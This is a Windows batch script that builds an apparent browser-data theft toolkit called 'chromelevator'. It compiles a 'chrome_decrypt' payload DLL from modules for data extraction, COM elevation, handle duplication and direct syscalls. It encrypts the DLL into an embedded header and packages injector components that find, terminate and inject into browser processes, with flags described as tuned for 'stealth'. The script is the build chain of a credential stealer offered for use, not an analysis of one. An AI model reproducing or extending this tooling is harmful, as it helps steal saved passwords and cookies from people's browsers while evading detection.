@echo off
set "BUILD_DIR=build"
set "SRC_DIR=src"
set "LIBS_DIR=libs"
set "PAYLOAD_DLL_NAME=chrome_decrypt.dll"
set "ENCRYPTOR_EXE_NAME=encryptor.exe"
set "PAYLOAD_HEADER=payload_data.hpp"

:: Compiler Flags (Optimized for size & stealth)
set "CFLAGS_COMMON=/nologo /W3 /Os /MT /GS- /Gy /GL /GR- /Gw /Zc:threadSafeInit-"
set "CFLAGS_CPP=/std:c++17 /EHsc"
set "CFLAGS_SQLITE=/nologo /W0 /O1 /Os /MT /GS- /Gy /GL /DSQLITE_OMIT_LOAD_EXTENSION"

:: 0. Clean and Prepare
echo [*] Cleaning previous build artifacts...
if exist "%BUILD_DIR%" rd /s /q "%BUILD_DIR%"
mkdir "%BUILD_DIR%"

:: 1. SQLite
echo [1/4] Compiling SQLite3...
cl %CFLAGS_SQLITE% /c "%LIBS_DIR%\sqlite\sqlite3.c" /Fo"%BUILD_DIR%\sqlite3.obj" >nul 2>&1
if %ERRORLEVEL% neq 0 ( echo [-] SQLite Compilation FAILED! & exit /b 1 )
lib /NOLOGO /LTCG /OUT:"%BUILD_DIR%\sqlite3.lib" "%BUILD_DIR%\sqlite3.obj" >nul 2>&1
if %ERRORLEVEL% neq 0 ( echo [-] SQLite Library Creation FAILED! & exit /b 1 )

:: 2. Payload (Decryption logic)
echo [2/4] Compiling Decryption Payload...
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\sys\bootstrap.cpp" /Fo"%BUILD_DIR%\bootstrap.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%\sqlite" /c "%SRC_DIR%\payload\payload_main.cpp" /Fo"%BUILD_DIR%\payload_main.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\com\elevator.cpp" /Fo"%BUILD_DIR%\elevator.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%\sqlite" /c "%SRC_DIR%\payload\data_extractor.cpp" /Fo"%BUILD_DIR%\data_extractor.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\crypto\aes_gcm.cpp" /Fo"%BUILD_DIR%\aes_gcm.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\crypto\chacha20.cpp" /Fo"%BUILD_DIR%\chacha20.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api_payload.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\pipe_client.cpp" /Fo"%BUILD_DIR%\pipe_client.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\handle_duplicator.cpp" /Fo"%BUILD_DIR%\handle_duplicator.obj"
if %ERRORLEVEL% neq 0 ( echo [-] Payload Compilation FAILED! & exit /b 1 )

ml64.exe /nologo /c /Fo"%BUILD_DIR%\syscall_trampoline_payload.obj" "%SRC_DIR%\sys\syscall_trampoline_x64.asm"
if %ERRORLEVEL% neq 0 ( echo [-] ASM Compilation FAILED! & exit /b 1 )

link /NOLOGO /LTCG /DLL /DEF:chrome_decrypt.def /OUT:"%BUILD_DIR%\%PAYLOAD_DLL_NAME%" ^
    "%BUILD_DIR%\payload_main.obj" "%BUILD_DIR%\bootstrap.obj" "%BUILD_DIR%\elevator.obj" ^
    "%BUILD_DIR%\data_extractor.obj" "%BUILD_DIR%\aes_gcm.obj" ^
    "%BUILD_DIR%\chacha20.obj" "%BUILD_DIR%\internal_api_payload.obj" ^
    "%BUILD_DIR%\pipe_client.obj" "%BUILD_DIR%\handle_duplicator.obj" ^
    "%BUILD_DIR%\syscall_trampoline_payload.obj" "%BUILD_DIR%\sqlite3.lib" ^
    bcrypt.lib ole32.lib oleaut32.lib shell32.lib advapi32.lib crypt32.lib version.lib
if %ERRORLEVEL% neq 0 ( echo [-] Payload Linking FAILED! & exit /b 1 )

:: 3. Encryptor (Required to embed payload into headers)
echo [3/4] Generating Payload Header...
cl %CFLAGS_COMMON% %CFLAGS_CPP% /Fe"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" ^
    "%SRC_DIR%\tools\encryptor.cpp" "%BUILD_DIR%\chacha20.obj" /link /NOLOGO bcrypt.lib >nul 2>&1
if %ERRORLEVEL% neq 0 ( echo [-] Encryptor Compilation FAILED! & exit /b 1 )

"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" "%BUILD_DIR%\%PAYLOAD_DLL_NAME%" "%BUILD_DIR%\chrome_decrypt.enc" "%BUILD_DIR%\%PAYLOAD_HEADER%" >nul 2>&1
if %ERRORLEVEL% neq 0 ( echo [-] Payload Encryption FAILED! & exit /b 1 )

:: 4. Injector Objects (Statically Linked to C#)
echo [4/4] Creating Static Library (Monolith)...
ml64.exe /nologo /c /Fo"%BUILD_DIR%\syscall_trampoline.obj" "%SRC_DIR%\sys\syscall_trampoline_x64.asm" >nul 2>&1

cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector_main.cpp" /Fo"%BUILD_DIR%\injector_main.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_discovery.cpp" /Fo"%BUILD_DIR%\browser_discovery.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_terminator.cpp" /Fo"%BUILD_DIR%\browser_terminator.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\process_manager.cpp" /Fo"%BUILD_DIR%\process_manager.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\pipe_server.cpp" /Fo"%BUILD_DIR%\pipe_server.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector.obj"
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api.obj"
if %ERRORLEVEL% neq 0 ( echo [-] Injector Objects Compilation FAILED! & exit /b 1 )

lib /NOLOGO /LTCG /OUT:"%~dp0chromelevator.lib" ^
    "%BUILD_DIR%\injector_main.obj" "%BUILD_DIR%\browser_discovery.obj" ^
    "%BUILD_DIR%\browser_terminator.obj" "%BUILD_DIR%\process_manager.obj" ^
    "%BUILD_DIR%\pipe_server.obj" "%BUILD_DIR%\injector.obj" ^
    "%BUILD_DIR%\internal_api.obj" "%BUILD_DIR%\chacha20.obj" ^
    "%BUILD_DIR%\syscall_trampoline.obj" ^
    "%BUILD_DIR%\elevator.obj" "%BUILD_DIR%\sqlite3.lib"
if %ERRORLEVEL% neq 0 ( echo [-] Final Library Creation FAILED! & exit /b 1 )

echo [+] SUCCESS: chromelevator.lib is ready at %~dp0chromelevator.lib
